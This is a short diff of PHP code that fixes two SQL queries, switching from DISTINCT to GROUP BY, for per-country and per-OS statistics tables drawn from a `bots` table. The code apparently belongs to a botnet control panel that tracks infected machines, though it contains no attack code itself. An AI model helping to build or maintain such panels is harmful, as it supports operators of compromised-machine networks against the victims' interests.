@@ -36,9 +36,9 @@ $TEMPLATE['text'] .= '			</table>
 										<th>Count</th>
 										<th>%</th>
 									</tr>';
-$stmt = db_query("SELECT DISTINCT `country`, COUNT(`country`) AS `cnt`,
+$stmt = db_query("SELECT `country`, COUNT(`country`) AS `cnt`,
 							(COUNT(`country`) /  (SELECT COUNT(`id`) FROM `bots` WHERE `uid` = :1 OR `uid` = -1) * 100) AS `perc`
-								FROM `bots` WHERE `uid` = :1 OR `uid` = -1", getUID());
+								FROM `bots` WHERE `uid` = :1 OR `uid` = -1 GROUP BY `country`", getUID());
 while ($row = $stmt->fetch())
 {
 	$TEMPLATE['text'] .= "			<tr>
@@ -59,9 +59,9 @@ $TEMPLATE['text'] .= '		</table>
 										<th>Count</th>
 										<th>%</th>
 									</tr>';
-$stmt = db_query("SELECT DISTINCT `os`, COUNT(`os`) AS `cnt`,
+$stmt = db_query("SELECT `os`, COUNT(`os`) AS `cnt`,
 							(COUNT(`os`) /  (SELECT COUNT(`id`) FROM `bots` WHERE `uid` = :1 OR `uid` = -1) * 100) AS `perc`
-								FROM `bots` WHERE `uid` = :1 OR `uid` = -1", getUID());
+								FROM `bots` WHERE `uid` = :1 OR `uid` = -1 GROUP BY `os`", getUID());
 while ($row = $stmt->fetch())
 {
 	$TEMPLATE['text'] .= "			<tr>
